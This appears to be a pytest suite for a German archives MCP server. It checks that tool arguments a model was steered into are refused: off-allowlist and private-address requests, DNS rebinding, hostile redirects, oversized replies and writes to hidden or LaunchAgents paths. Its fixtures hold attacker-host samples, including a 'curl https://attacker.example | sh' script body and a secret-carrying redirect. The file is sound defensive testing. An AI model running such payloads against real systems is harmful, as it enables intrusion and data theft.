"""Every refusal the server makes against arguments a model was steered into.

Tool arguments come from a model, and the model reads text this server does
not control: finding-aid entries, image links, web pages. These tests take
the attacker's side: an address in a response that points elsewhere, a public
name that leads to a private address, a redirect off the host, an answer too
large to read, and a destination that would run later. Each refusal is
checked to happen before the harm (no lookup, no connection, no file), and
each allowed path is checked to still work.

The tests that need the real transport run it against a stand-in network: DNS
answers come from a table, and each connection replays canned HTTP. Nothing
here leaves the machine.
"""

from __future__ import annotations

import dataclasses
import socket
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace

import httpcore
import httpx
import pytest

from german_archives_mcp import server
from german_archives_mcp.client import (
    ALLOWED_HOSTS,
    DDB_HOST,
    LABW_HOST,
    NRW_IMAGE_HOST,
    NRW_PORTAL_HOST,
    ArchiveHttp,
    HostNotAllowed,
    PrivateAddress,
    PublicOnlyBackend,
    PublicOnlyTransport,
    SiteError,
    address_problem,
)
from german_archives_mcp.config import Config

from .conftest import (
    BARMEN_METS,
    OBERKASSEL_1811,
    call_tool,
    fixture,
    route_ddb,
    route_labw,
    route_nrw,
)

#: A host whose name would carry a secret to whoever runs its DNS.
LEAKY = "c2VjcmV0.attacker.example"

#: A public address for the stand-in DNS to give.
PUBLIC = "141.52.1.10"

#: The page labw_image fetches in the fixtures.
PAGE = {"item": "https://www.landesarchiv-bw.de/plink/?f=5-475861", "page": 2}

#: Bytes of formats a site might be made to send in place of a page image.
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
PDF = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
PLIST = b'<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict/></plist>\n'


# --------------------------------------------------------------------------- #
# A stand-in network for the real transport
# --------------------------------------------------------------------------- #
class Resolver:
    """Stands in for ``socket.getaddrinfo``: answers from a table, records every name."""

    def __init__(self) -> None:
        self.answers: dict[str, list[str] | Iterator[list[str]]] = {}
        self.asked: list[str] = []

    def __call__(self, host, port, family=0, type=0, proto=0, flags=0):
        self.asked.append(host)
        answer = self.answers.get(host)
        if answer is not None and not isinstance(answer, list):
            answer = next(answer)
        if answer is None:
            raise socket.gaierror(socket.EAI_NONAME, "not in the test's table")
        return [
            (socket.AF_INET6, socket.SOCK_STREAM, 6, "", (a, port, 0, 0))
            if ":" in a
            else (socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port))
            for a in answer
        ]


class Network(httpcore.AsyncNetworkBackend):
    """Stands in for the internet: records each connection and replays canned HTTP."""

    def __init__(self) -> None:
        self.connects: list[str] = []
        self.replies: list[bytes] = []

    async def connect_tcp(self, host, port, timeout=None, local_address=None, socket_options=None):
        self.connects.append(host)
        if not self.replies:
            raise httpcore.ConnectError("no route: the suite never touches the network")
        return httpcore.AsyncMockStream([self.replies.pop(0)])

    async def connect_unix_socket(self, path, timeout=None, socket_options=None):
        raise httpcore.ConnectError("no sockets here")

    async def sleep(self, seconds):
        return None


def reply(status: int, body: bytes = b"", *, length: bool = True, **headers: str) -> bytes:
    """One HTTP/1.1 response that closes its connection."""
    lines = [f"HTTP/1.1 {status} Canned", "Connection: close"]
    lines += [f"{k.replace('_', '-')}: {v}" for k, v in headers.items()]
    if length:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


@pytest.fixture
def network(tmp_path, monkeypatch) -> SimpleNamespace:
    """The server's client on the stand-in network, through the real public-only transport."""
    dns, net = Resolver(), Network()
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = ArchiveHttp(
        tmp_path / "cache",
        min_interval=0.0,
        backoff=0.0,
        host_floors={},
        transport=PublicOnlyTransport(backend=net),
    )
    monkeypatch.setattr(server.runtime, "http", http)
    monkeypatch.setattr(server.runtime, "config", Config(cache_dir=tmp_path / "cache"))
    return SimpleNamespace(http=http, dns=dns, net=net)


def link(path: Path, target: Path) -> None:
    """Make a symbolic link to a folder, or skip where the system will not let a test."""
    try:
        path.symlink_to(target, target_is_directory=True)
    except OSError as exc:  # Windows without the privilege
        pytest.skip(f"cannot make a symbolic link here: {exc}")


def configure(monkeypatch, **changes) -> None:
    """Change the running server's settings, as the operator's environment would."""
    monkeypatch.setattr(
        server.runtime, "config", dataclasses.replace(server.runtime.config, **changes)
    )


# --------------------------------------------------------------------------- #
# Which hosts are reached
# --------------------------------------------------------------------------- #
async def test_any_other_host_is_refused_with_no_lookup_and_no_request(network):
    for url in (f"https://{LEAKY}/x", "https://www.landesarchiv-bw.de/plink/?f=5-1"):
        with pytest.raises(HostNotAllowed):
            await network.http.get_json(url, ttl_days=1)
    assert network.dns.asked == [] and network.net.connects == []


def test_the_allowlist_is_the_four_hosts_and_nothing_else():
    assert ALLOWED_HOSTS == {DDB_HOST, LABW_HOST, NRW_PORTAL_HOST, NRW_IMAGE_HOST}


async def test_a_viewer_link_in_an_nrw_hit_is_never_fetched(served, sites):
    """nrw_search returns DFG-Viewer and other archives' METS links as data only."""
    answer = fixture("nrw_search_barmen_1850.json")
    answer["searchResult"][0]["disitalisat"] = [
        f"https://dfg-viewer.de/show/?tx_dlf[id]=https%3A%2F%2F{LEAKY}%2Fmets.xml"
    ]
    route_nrw(sites, **{"Geburtsregister Barmen": answer})
    viewer = sites.route(host="dfg-viewer.de").mock(return_value=httpx.Response(200))
    elsewhere = sites.route(host=LEAKY).mock(return_value=httpx.Response(200))
    out = await call_tool("nrw_search", query="Geburtsregister Barmen")
    assert out["hits"][0]["mets"] == f"https://{LEAKY}/mets.xml"
    assert out["hits"][0]["readable_by_nrw_image"] is False
    assert viewer.call_count == 0 and elsewhere.call_count == 0


async def test_an_nrw_item_on_another_host_is_refused_before_any_request(served, sites, tmp_path):
    portal, images = route_nrw(sites)
    for item in (f"https://{LEAKY}/digitalisate/Abt_Rheinland/x/mets.xml", f"//{LEAKY}/mets.xml"):
        out = await call_tool("nrw_image", item=item, page=1, destination=str(tmp_path / "p.jpg"))
        assert out["error"] == "unknown_item"
    assert portal.call_count == 0 and images.call_count == 0


async def test_an_image_link_in_a_ddb_entry_is_never_fetched(served, sites):
    """ddb_item returns the holder's image links as data and requests none of them."""
    route_ddb(sites)
    elsewhere = sites.route(host="www.duesseldorf.de").mock(return_value=httpx.Response(200))
    out = await call_tool("ddb_item", id=OBERKASSEL_1811)
    assert out["images"]["listed"][0]["url"].startswith("https://www.duesseldorf.de/")
    assert elsewhere.call_count == 0


async def test_a_permalink_on_another_host_is_not_a_permalink(served, sites, tmp_path):
    out = await call_tool(
        "labw_image",
        item=f"https://{LEAKY}/plink/?f=5-475861",
        page=1,
        destination=str(tmp_path / "p.jpg"),
    )
    assert out["error"] == "unknown_signature"


async def test_a_permalink_redirect_off_the_archives_paths_is_not_followed(served, sites, tmp_path):
    """The permalink's answer is read, never requested: a hostile Location goes nowhere."""
    route_labw(
        sites,
        **{
            "plink.php": httpx.Response(
                302, headers={"location": f"https://{LEAKY}/collect?d=secret"}
            )
        },
    )
    elsewhere = sites.route(host=LEAKY).mock(return_value=httpx.Response(200))
    out = await call_tool("labw_image", destination=str(tmp_path / "p.jpg"), **PAGE)
    assert out["error"] == "api_changed" and elsewhere.call_count == 0


async def test_a_redirect_to_another_host_is_never_followed(served, sites):
    sites.route(host=DDB_HOST).mock(
        return_value=httpx.Response(302, headers={"location": f"https://{LEAKY}/x"})
    )
    elsewhere = sites.route(host=LEAKY).mock(return_value=httpx.Response(200, json={}))
    out = await call_tool("ddb_search", query="x")
    assert out["error"] == "moved" and elsewhere.call_count == 0


# --------------------------------------------------------------------------- #
# Which addresses a connection reaches
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "address",
    [
        "10.0.0.7",
        "172.16.4.2",
        "192.168.1.1",
        "127.0.0.1",
        "169.254.169.254",
        "100.64.0.1",
        "224.0.0.251",
        "240.0.0.1",
        "0.0.0.0",
        "::1",
        "fe80::1",
        "fd00::1",
        "::ffff:192.168.1.1",
        "64:ff9b::a00:1",
        "2002:a00:1::1",
    ],
)
def test_a_non_public_address_is_named(address):
    assert address_problem(address)


@pytest.mark.parametrize("address", ["141.52.1.10", "8.8.8.8", "2606:4700:4700::1111"])
def test_a_public_address_passes(address):
    assert address_problem(address) is None


@pytest.mark.parametrize("address", ["10.0.0.7", "127.0.0.1", "169.254.169.254", "fd00::1"])
async def test_an_allowed_name_that_leads_to_a_private_address_is_refused_at_connect(
    network, address
):
    network.dns.answers[DDB_HOST] = [address]
    out = await call_tool("ddb_search", query="x")
    assert out["error"] == "private_address"
    assert address not in out["message"]
    assert network.net.connects == []


async def test_one_private_address_among_public_ones_is_enough_to_refuse(network):
    network.dns.answers[LABW_HOST] = [PUBLIC, "10.0.0.7"]
    with pytest.raises(PrivateAddress):
        await network.http.get_text(f"https://{LABW_HOST}/ofs21/x", ttl_days=1)
    assert network.net.connects == []


async def test_a_name_that_changes_its_answer_gains_nothing(network):
    """DNS rebinding: public for the first connection, private for the retry."""
    network.dns.answers[DDB_HOST] = iter([[PUBLIC], ["127.0.0.1"]])
    out = await call_tool("ddb_search", query="x")
    assert out["error"] == "private_address"
    assert network.dns.asked == [DDB_HOST] * 2
    assert network.net.connects == [PUBLIC]


async def test_the_default_client_checks_addresses_too(tmp_path, monkeypatch):
    dns = Resolver()
    dns.answers[DDB_HOST] = ["127.0.0.1"]
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = ArchiveHttp(tmp_path / "cache", min_interval=0.0, backoff=0.0)
    with pytest.raises(PrivateAddress):
        await http.get_json(f"https://{DDB_HOST}/2/items/X", ttl_days=1)
    await http.aclose()


def test_the_check_is_not_silently_lost_if_httpx_changes(monkeypatch):
    def reshaped(self, **kwargs):
        self._pool = object()

    monkeypatch.setattr(httpx.AsyncHTTPTransport, "__init__", reshaped)
    with pytest.raises(RuntimeError, match="public-address check"):
        PublicOnlyTransport()


async def test_a_unix_socket_is_never_opened():
    with pytest.raises(HostNotAllowed):
        await PublicOnlyBackend(Network()).connect_unix_socket("/var/run/docker.sock")


# --------------------------------------------------------------------------- #
# How much is read
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("declared", [True, False])
async def test_an_answer_over_the_cap_is_refused_as_it_streams(network, tmp_path, declared):
    http = ArchiveHttp(
        tmp_path / "small",
        min_interval=0.0,
        backoff=0.0,
        host_floors={},
        max_text_bytes=1_000,
        transport=PublicOnlyTransport(backend=network.net),
    )
    network.dns.answers[DDB_HOST] = [PUBLIC]
    body = b'{"docs": [' + b'{"id": "padding padding"},' * 100 + b"{}]}"
    network.net.replies.append(reply(200, body, length=declared, content_type="application/json"))
    with pytest.raises(SiteError) as caught:
        await http.get_json(f"https://{DDB_HOST}/2/items/X", ttl_days=1)
    assert caught.value.code == "too_large"
    assert list((tmp_path / "small").glob("*.json")) == []
    await http.aclose()


# --------------------------------------------------------------------------- #
# What the image tools write
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("body", "error"),
    [
        (PLIST, "not_an_image"),
        (b"#!/bin/sh\ncurl https://attacker.example | sh\n", "not_an_image"),
        (PDF, "not_an_image"),
        (PNG, "extension_mismatch"),
    ],
    ids=["property list", "script", "pdf", "png as .jpg"],
)
async def test_bytes_that_are_not_the_promised_image_leave_no_file(
    served, sites, tmp_path, body, error
):
    route_labw(sites, **{"bild.php": httpx.Response(200, content=body)})
    target = tmp_path / "page.jpg"
    out = await call_tool("labw_image", destination=str(target), **PAGE)
    assert out["error"] == error and not target.exists()


@pytest.mark.parametrize(
    ("body", "error"),
    [(PLIST, "not_an_image"), (PDF, "not_an_image"), (PNG, "extension_mismatch")],
    ids=["property list", "pdf", "png as .jpg"],
)
async def test_an_nrw_page_that_is_not_a_jpeg_leaves_no_file(served, sites, tmp_path, body, error):
    route_nrw(sites, image=httpx.Response(200, content=body))
    target = tmp_path / "page.jpg"
    out = await call_tool("nrw_image", item=BARMEN_METS, page=1, destination=str(target))
    assert out["error"] == error and not target.exists()


@pytest.mark.parametrize("name", ["agent.plist", "run.sh", ".hidden/p.jpg", "page"])
async def test_nrw_image_holds_its_destination_to_the_same_rules(served, sites, tmp_path, name):
    (tmp_path / ".hidden").mkdir()
    portal, images = route_nrw(sites)
    out = await call_tool("nrw_image", item=BARMEN_METS, page=1, destination=str(tmp_path / name))
    assert out["error"] in ("bad_extension", "hidden_path")
    assert images.call_count == 0 and not (tmp_path / name).exists()


async def test_nrw_image_writes_nothing_under_library(served, sites, home):
    _, images = route_nrw(sites)
    out = await call_tool(
        "nrw_image",
        item=BARMEN_METS,
        page=1,
        destination=str(home / "Library/LaunchAgents/a.jpg"),
    )
    assert out["error"] == "protected_location" and images.call_count == 0


@pytest.mark.parametrize(
    "name", ["agent.plist", "page.png", "run.sh", "page", "page.jpg.command", ".jpg"]
)
async def test_a_destination_without_a_jpeg_suffix_is_refused_before_any_request(
    served, sites, tmp_path, name
):
    route = route_labw(sites)
    out = await call_tool("labw_image", destination=str(tmp_path / name), **PAGE)
    assert out["error"] in ("bad_extension", "hidden_path") and route.call_count == 0
    assert not (tmp_path / name).exists()


async def test_an_upper_case_suffix_is_still_a_jpeg(served, sites, tmp_path):
    route_labw(sites)
    out = await call_tool("labw_image", destination=str(tmp_path / "PAGE.JPEG"), **PAGE)
    assert out["format"] == "jpeg"


async def test_a_relative_destination_is_refused(served, sites):
    out = await call_tool("labw_image", destination="images/page.jpg", **PAGE)
    assert out["error"] == "relative_destination"


async def test_an_existing_file_is_never_overwritten(served, sites, tmp_path):
    route = route_labw(sites)
    target = tmp_path / "page.jpg"
    target.write_text("mine")
    out = await call_tool("labw_image", destination=str(target), **PAGE)
    assert out["error"] == "destination_exists" and route.call_count == 0
    assert target.read_text() == "mine"


async def test_a_missing_folder_is_refused(served, sites, tmp_path):
    out = await call_tool("labw_image", destination=str(tmp_path / "no/such/p.jpg"), **PAGE)
    assert out["error"] == "no_such_directory"


@pytest.mark.parametrize(
    "where",
    [".hidden/page.jpg", ".page.jpg", "visible/.git/hooks/page.jpg", "link-to-hidden/page.jpg"],
)
async def test_a_hidden_destination_is_refused_before_any_request(served, sites, tmp_path, where):
    route = route_labw(sites)
    (tmp_path / ".hidden").mkdir()
    (tmp_path / "visible/.git/hooks").mkdir(parents=True)
    link(tmp_path / "link-to-hidden", tmp_path / ".hidden")
    out = await call_tool("labw_image", destination=str(tmp_path / where), **PAGE)
    assert out["error"] == "hidden_path" and route.call_count == 0
    assert list((tmp_path / ".hidden").iterdir()) == []


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    """A home folder with a Library, standing in for the user's."""
    fake = tmp_path / "home"
    (fake / "Library/LaunchAgents").mkdir(parents=True)
    (fake / "Library/Mobile Documents/Genealogy").mkdir(parents=True)
    (fake / "Pictures").mkdir()
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake))
    return fake


@pytest.mark.parametrize(
    "where", ["Library/LaunchAgents/agent.jpg", "Library/Mobile Documents/Genealogy/page.jpg"]
)
async def test_nothing_is_written_under_library(served, sites, home, where):
    route = route_labw(sites)
    out = await call_tool("labw_image", destination=str(home / where), **PAGE)
    assert out["error"] == "protected_location" and route.call_count == 0
    assert "GERMAN_ARCHIVES_DOWNLOAD_DIR" in out["message"]


async def test_library_is_recognised_however_it_is_spelt(served, sites, home):
    if not (home / "library").exists():
        pytest.skip("this file system tells upper and lower case apart")
    route = route_labw(sites)
    out = await call_tool(
        "labw_image", destination=str(home / "library/LaunchAgents/a.jpg"), **PAGE
    )
    assert out["error"] == "protected_location" and route.call_count == 0


async def test_a_link_into_library_is_followed_and_refused(served, sites, home):
    route_labw(sites)
    link(home / "Pictures/agents", home / "Library/LaunchAgents")
    out = await call_tool("labw_image", destination=str(home / "Pictures/agents/a.jpg"), **PAGE)
    assert out["error"] == "protected_location"
    assert list((home / "Library/LaunchAgents").iterdir()) == []


async def test_a_dangling_link_is_never_written_through(served, sites, tmp_path):
    route_labw(sites)
    dangling = tmp_path / "page.jpg"
    try:
        dangling.symlink_to(tmp_path / "elsewhere.jpg")
    except OSError as exc:
        pytest.skip(f"cannot make a symbolic link here: {exc}")
    out = await call_tool("labw_image", destination=str(dangling), **PAGE)
    assert out["error"] == "destination_exists" and not (tmp_path / "elsewhere.jpg").exists()


async def test_with_a_download_folder_every_file_lands_inside_it(
    served, sites, tmp_path, monkeypatch
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    configure(monkeypatch, download_dir=folder)
    route_labw(sites)
    out = await call_tool("labw_image", destination=str(folder / "page.jpg"), **PAGE)
    assert out["path"] == str((folder / "page.jpg").resolve())


@pytest.mark.parametrize(
    "where", ["page.jpg", "downloads/../page.jpg", "downloads/escape/page.jpg", "downloadsX/a.jpg"]
)
async def test_with_a_download_folder_nothing_lands_outside_it(
    served, sites, tmp_path, monkeypatch, where
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    (tmp_path / "downloadsX").mkdir()
    link(folder / "escape", tmp_path)
    configure(monkeypatch, download_dir=folder)
    route = route_labw(sites)
    out = await call_tool("labw_image", destination=str(tmp_path / where), **PAGE)
    assert out["error"] == "outside_download_dir" and route.call_count == 0
    assert str(folder) in out["message"]
    assert not (tmp_path / "page.jpg").exists()


async def test_a_download_folder_may_itself_be_hidden_or_under_library(
    served, sites, home, monkeypatch
):
    """The operator chose the folder; the rules apply to what a model adds below it."""
    route_labw(sites)
    for folder in (home / ".archive", home / "Library/Mobile Documents/Genealogy"):
        folder.mkdir(exist_ok=True)
        configure(monkeypatch, download_dir=folder)
        out = await call_tool("labw_image", destination=str(folder / "page.jpg"), **PAGE)
        assert out["format"] == "jpeg", out
        (folder / ".cache").mkdir()
        out = await call_tool("labw_image", destination=str(folder / ".cache/page.jpg"), **PAGE)
        assert out["error"] == "hidden_path"


async def test_a_download_folder_does_not_unlock_library_beneath_it(
    served, sites, home, monkeypatch
):
    configure(monkeypatch, download_dir=home)
    route = route_labw(sites)
    out = await call_tool(
        "labw_image", destination=str(home / "Library/LaunchAgents/a.jpg"), **PAGE
    )
    assert out["error"] == "protected_location" and route.call_count == 0
